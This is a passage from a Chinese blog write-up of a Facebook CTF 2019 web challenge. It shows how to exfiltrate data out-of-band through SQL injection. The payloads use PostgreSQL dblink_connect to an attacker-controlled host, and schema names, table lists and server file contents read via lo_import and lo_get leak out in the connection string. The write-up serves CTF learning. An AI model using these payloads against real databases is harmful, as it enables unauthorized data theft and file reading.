<p>在自己的服务器上安装<code>postgresql</code>，在配置文件<code>postgresql.conf</code>中设置：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">listen_addresses</span> = <span class="string">'*'</span></span><br></pre></td></tr></table></figure></p>
<p>利用tcpdump监听<code>5432</code>端口，查看请求包的信息：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -nX -i eth0<span class="built_in"> port </span>5432</span><br></pre></td></tr></table></figure></p>
<p>postgresql安装后默认用户为<code>postgres</code>，无密码，且有一个<code>postgres</code>的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息</p>
<p>修改payload：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="symbol">'host</span>=IP user=postgres password= dbname=postgres')) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p>携带了连接信息：<br><img src="https://i.loli.net/2019/06/13/5d01fb1ee087f78253.png" alt=""></p>
<p>列出schema：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=IP user='</span> || (<span class="keyword">SELECT</span> string_agg(schema_name,<span class="string">':'</span>) <span class="keyword">FROM</span> information_schema.schemata) || <span class="string">' password=postgres dbname=postgres'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d01fbce5191773760.png" alt=""></p>
<blockquote>
<p>String_agg：有两个参数一个是需要合并的字段名称或者字面量，还有就是合并后以何种分隔符，即：string_agg(expression, delimiter)。</p>
</blockquote>
<p>列出当前schema的table：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=IP user='</span> || (<span class="keyword">SELECT</span> string_agg(tablename, <span class="string">':'</span>) <span class="keyword">FROM</span> pg_catalog.pg_tables <span class="keyword">WHERE</span> schemaname=current_schema()) || <span class="string">' password=postgres dbname=postgres'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d01fd22325a750489.png" alt=""></p>
<p>列出searches的行数<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=IP user='</span> || (<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> searches) || <span class="string">' password=postgres dbname=postgres'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p>发现为空，说明没有内容<br>由于<code>pg_read_file</code>不能用，我们可以使用<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=IP user='</span> || (<span class="keyword">SELECT</span> lo_import(<span class="string">'/var/lib/postgresql/data/secret'</span>)) || <span class="string">' password=postgres dbname=postgres'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0201e048b8e69600.png" alt=""><br>成功了！！！</p>
<p>每个文件都可以对应于一个oid<br>我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=IP user='</span> || (<span class="keyword">SELECT</span> string_agg(<span class="keyword">cast</span>(l.oid <span class="keyword">as</span> <span class="built_in">text</span>), <span class="string">':'</span>) <span class="keyword">FROM</span> pg_largeobject_metadata l) || <span class="string">' password=postgres dbname=postgres'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0202849d7c926302.png" alt=""></p>
<p>我们尝试挨个读取，最终在<code>16444</code>读到了flag内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a' UNION <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> dblink_connect(<span class="string">'host=IP user='</span> || (<span class="keyword">SELECT</span> convert_from(lo_get(<span class="number">16444</span>), <span class="string">'UTF8'</span>)) || <span class="string">' password=postgres dbname=postgres'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/06/13/5d0202971c8cd90441.png" alt=""></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/06/12/CTF/fbctf2019/">http://microvorld.com/2019/06/12/CTF/fbctf2019/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" title="MyBB &lt;= 1.8.20--(From Stored XSS to RCE)"><span>< PreviousPost</span><br><span class="prevTitle">MyBB &lt;= 1.8.20--(From Stored XSS to RCE)</span></a><a class="nextSlogan" href="/2019/06/06/CTF/qwb2019/" title="qwbctf2019"><span>NextPost ></span><br><span class="nextTitle">qwbctf2019</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Facebook-ctf-2019"><span class="toc-number">1.</span> <span class="toc-text">Facebook ctf 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rceservice"><span class="toc-number">1.1.1.</span> <span class="toc-text">rceservice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#events"><span class="toc-number">1.1.2.</span> <span class="toc-text">events</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#products-manager"><span class="toc-number">1.1.3.</span> <span class="toc-text">products manager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pdfme"><span class="toc-number">1.1.4.</span> <span class="toc-text">pdfme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hr-admin-module"><span class="toc-number">1.1.5.</span> <span class="toc-text">hr_admin_module</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>